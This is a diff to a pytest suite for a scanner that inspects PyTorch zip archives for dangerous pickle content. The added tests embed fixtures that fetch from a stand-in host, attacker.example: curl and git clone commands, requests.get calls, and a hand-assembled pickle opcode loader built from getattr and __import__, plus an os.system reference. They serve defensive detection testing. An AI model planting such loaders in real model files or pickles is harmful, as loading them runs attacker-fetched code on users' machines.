@@ -78,6 +78,17 @@ _HF_TORCHSCRIPT_ST_QA_REVISION = "a50ef00143b4d5391434df20ae11632588ac25be"
 _TORCHSCRIPT_DEBUG_PKL = b"\x80\x02X\x18\x00\x00\x00FORMAT_WITH_STRING_TABLEq\x00."
 
 
+def _has_network_evidence_for_url(result: ScanResult, url: str) -> bool:
+    return any(
+        issue.rule_code == "S310"
+        and issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("type") == "explicit_network_pattern"
+        and issue.details.get("pattern_type") == "url"
+        and issue.details.get("matched_text") == url
+        for issue in result.issues
+    )
+
+
 def _pickle_global(module: str, name: str) -> bytes:
     return b"c" + module.encode("ascii") + b"\n" + name.encode("ascii") + b"\n"
 
@@ -4435,7 +4446,7 @@ def test_pytorch_zip_scans_pickle_members_past_pickle_raw_window(tmp_path: Path)
     payload = pickle.dumps(
         {
             "padding": "A" * 512,
-            "endpoint": "http://attacker.example/model",
+            "code": "requests.get('http://attacker.example/model')",
         },
         protocol=4,
     )
@@ -4459,6 +4470,227 @@ def test_pytorch_zip_scans_pickle_members_past_pickle_raw_window(tmp_path: Path)
     ]
     assert network_failures
     assert any(check.location == f"{model_path}:archive/data.pkl" for check in network_failures)
+
+
+@pytest.mark.parametrize(
+    ("member_name", "member_data", "observed_url", "expect_url"),
+    [
+        (
+            "archive/possessive-metadata.pkl",
+            pickle.dumps(
+                {"metadata": "Author's docs: https://example.invalid/a'b/os.system(cmd)"},
+                protocol=4,
+            ),
+            "https://example.invalid/a'b/os.system(cmd)",
+            False,
+        ),
+        (
+            "archive/opcode-loader.pkl",
+            b"\x80\x04"
+            + _pickle_global("builtins", "getattr")
+            + _pickle_global("builtins", "__import__")
+            + _pickle_binunicode(b"requests")
+            + b"\x85R"
+            + _pickle_binunicode(b"get")
+            + b"\x86R"
+            + _pickle_binunicode(b"https://attacker.example/payload")
+            + b"\x85R.",
+            "https://attacker.example/payload",
+            True,
+        ),
+    ],
+    ids=["possessive-metadata", "opcode-getattr-loader"],
+)
+def test_pytorch_zip_filters_urls_only_for_clean_pickle_members(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    member_name: str,
+    member_data: bytes,
+    observed_url: str,
+    expect_url: bool,
+) -> None:
+    model_path = create_mock_pytorch_zip(tmp_path / "member-context.pt", with_pickle=False, prefix="archive")
+    with zipfile.ZipFile(model_path, "a") as zip_file:
+        zip_file.writestr(member_name, member_data)
+
+    scanner = PyTorchZipScanner()
+    assert scanner.pickle_scanner is not None
+    monkeypatch.setattr(scanner.pickle_scanner, "check_for_network_communication", lambda *_args, **_kwargs: None)
+    result = scanner.scan(str(model_path))
+
+    assert _has_network_evidence_for_url(result, observed_url) is expect_url
+    if member_name == "archive/opcode-loader.pkl":
+        assert any(
+            issue.severity == IssueSeverity.CRITICAL
+            and issue.details.get("pickle_rule_code") == "DANGEROUS_CALL"
+            and issue.details.get("import_reference") == "builtins.getattr.__call__"
+            for issue in result.issues
+        )
+    if not expect_url:
+        assert not any(issue.rule_code in {"S302", "S309", "S310"} for issue in result.issues)
+        assert not any(
+            check.rule_code in {"S302", "S309", "S310"} and check.status == CheckStatus.FAILED
+            for check in result.checks
+        )
+
+
+@pytest.mark.parametrize("protocol", [0, 4], ids=["protocol-0", "protocol-4"])
+@pytest.mark.parametrize(
+    "loader",
+    [
+        "Use documentation example metadata | git clone https://attacker.example/payload",
+        'f"{client:https://attacker.example/payload}"',
+        "'/usr/bin/curl' 'https://attacker.example/payload'",
+        "['/usr/bin/curl', 'https://attacker.example/payload']",
+        "cmd='/usr/bin/curl https://attacker.example/payload'",
+        "{'argv': ['curl'], 'url': 'https://attacker.example/payload'}",
+        "{'argv': [b'curl'], 'url': 'https://attacker.example/payload'}",
+        r"C:\Windows\System32\curl.exe https://attacker.example/payload",
+    ],
+    ids=[
+        "shell-pipeline",
+        "f-string-format-dispatch",
+        "adjacent-curl-argv",
+        "list-curl-argv",
+        "assigned-curl-command",
+        "split-dict-curl-argv",
+        "bytes-split-dict-curl-argv",
+        "windows-curl-command",
+    ],
+)
+def test_pytorch_zip_keeps_implicit_execution_urls_actionable(
+    tmp_path: Path,
+    protocol: int,
+    loader: str,
+) -> None:
+    model_path = create_mock_pytorch_zip(tmp_path / "implicit-execution.pt", with_pickle=False, prefix="archive")
+    with zipfile.ZipFile(model_path, "a") as zip_file:
+        zip_file.writestr("archive/data.pkl", pickle.dumps({"loader": loader}, protocol=protocol))
+
+    result = PyTorchZipScanner().scan(str(model_path))
+
+    assert _has_network_evidence_for_url(result, "https://attacker.example/payload")
+
+
+def test_pytorch_zip_keeps_split_downloader_pickle_url_actionable(tmp_path: Path) -> None:
+    model_path = create_mock_pytorch_zip(tmp_path / "split-downloader.pt", with_pickle=False, prefix="archive")
+    payload = pickle.dumps({"argv": [b"curl"], "url": "https://attacker.example/payload"}, protocol=4)
+    with zipfile.ZipFile(model_path, "a") as zip_file:
+        zip_file.writestr("archive/data.pkl", payload)
+
+    result = PyTorchZipScanner().scan(str(model_path))
+
+    assert _has_network_evidence_for_url(result, "https://attacker.example/payload")
+
+
+def test_pytorch_zip_ignores_passive_downloader_dict_keys(tmp_path: Path) -> None:
+    model_path = create_mock_pytorch_zip(tmp_path / "dict-key-metadata.pt", with_pickle=False, prefix="archive")
+    payload = pickle.dumps(
+        {
+            "open": True,
+            "curl": "passive metadata",
+            "url": "https://docs.example.invalid/reference/os.system(command)",
+        },
+        protocol=4,
+    )
+    with zipfile.ZipFile(model_path, "a") as zip_file:
+        zip_file.writestr("archive/data.pkl", payload)
+
+    result = PyTorchZipScanner().scan(str(model_path))
+
+    assert not any(issue.rule_code in {"S302", "S309", "S310"} for issue in result.issues)
+    assert not any(
+        check.rule_code in {"S302", "S309", "S310"} and check.status == CheckStatus.FAILED for check in result.checks
+    )
+
+
+def test_pytorch_zip_keeps_undecodable_split_downloader_url_actionable(tmp_path: Path) -> None:
+    model_path = create_mock_pytorch_zip(tmp_path / "binary-downloader.pt", with_pickle=False, prefix="archive")
+    payload = pickle.dumps(
+        {"blob": b"\xff", "argv": [b"curl"], "url": "https://attacker.example/payload"},
+        protocol=4,
+    )
+    with zipfile.ZipFile(model_path, "a") as zip_file:
+        zip_file.writestr("archive/data.pkl", payload)
+
+    result = PyTorchZipScanner().scan(str(model_path))
+
+    assert any(
+        issue.rule_code == "S309"
+        and issue.severity == IssueSeverity.WARNING
+        and issue.details.get("url") == "https://attacker.example/payload"
+        for issue in result.issues
+    )
+
+
+def test_pytorch_zip_filters_inert_url_past_pickle_expensive_window(
+    tmp_path: Path,
+) -> None:
+    model_path = create_mock_pytorch_zip(tmp_path / "large-url-metadata.pt", with_pickle=False, prefix="archive")
+    inert_url = "https://docs.example.invalid/reference/os.system(command)"
+    payload = pickle.dumps({"padding": "A" * (1024 * 1024 + 128), "metadata": inert_url}, protocol=4)
+    with zipfile.ZipFile(model_path, "a") as zip_file:
+        zip_file.writestr("archive/hidden", payload)
+    result = PyTorchZipScanner(config={"max_jit_scan_member_bytes": len(payload) + 1}).scan(str(model_path))
+
+    assert not any(issue.rule_code in {"S302", "S309", "S310"} for issue in result.issues)
+    assert not any(
+        check.rule_code in {"S302", "S309", "S310"} and check.status == CheckStatus.FAILED for check in result.checks
+    )
+
+
+def test_pytorch_zip_uses_duplicate_member_identity_for_url_filtering(tmp_path: Path) -> None:
+    model_path = tmp_path / "duplicate-url-context.pt"
+    inert_url = "https://docs.example.invalid/reference/requests.get(url)"
+    retained_url = "https://attacker.example/payload"
+    clean_payload = pickle.dumps({"metadata": inert_url}, protocol=4)
+    suspicious_payload = pickle.dumps((os.system, {"metadata": retained_url}), protocol=4)
+    _write_zip_with_duplicate_data_pkl(model_path, clean_payload, suspicious_payload)
+
+    result = PyTorchZipScanner(config={"pickle_expensive_raw_scan_limit_bytes": 0}).scan(str(model_path))
+
+    assert result.metadata["pickle_files"].count("data.pkl") == 2
+    outcomes = [
+        outcome for outcome in result.metadata["pickle_member_outcomes"] if outcome["pickle_filename"] == "data.pkl"
+    ]
+    assert len(outcomes) == 2
+    assert [outcome["pickle_verdict"] for outcome in outcomes] == ["clean", "malicious"]
+    assert any(
+        issue.rule_code == "S309"
+        and issue.severity == IssueSeverity.WARNING
+        and issue.details.get("type") == "url_detected"
+        and issue.details.get("url") == retained_url
+        for issue in result.issues
+    )
+    assert not any(
+        issue.rule_code in {"S302", "S309", "S310"}
+        and (issue.details.get("matched_text") == inert_url or issue.details.get("url") == inert_url)
+        for issue in result.issues
+    )
+
+
+def test_pytorch_zip_preserves_same_offset_network_findings_per_member(tmp_path: Path) -> None:
+    model_path = create_mock_pytorch_zip(tmp_path / "multi-member-network.pt", with_pickle=False, prefix="archive")
+    url = "https://attacker.example/payload"
+    payload = pickle.dumps({"loader": f"requests.get('{url}')"}, protocol=0)
+    with zipfile.ZipFile(model_path, "a") as zip_file:
+        zip_file.writestr("archive/data.pkl", payload)
+        zip_file.writestr("archive/extra.pkl", payload)
+
+    result = PyTorchZipScanner().scan(str(model_path))
+
+    assert {
+        issue.location
+        for issue in result.issues
+        if issue.rule_code == "S310"
+        and issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("type") == "explicit_network_pattern"
+        and issue.details.get("pattern_type") == "url"
+        and issue.details.get("matched_text") == url
+    } == {
+        f"{model_path}:archive/data.pkl",
+        f"{model_path}:archive/extra.pkl",
+    }
 
 
 @pytest.mark.parametrize(
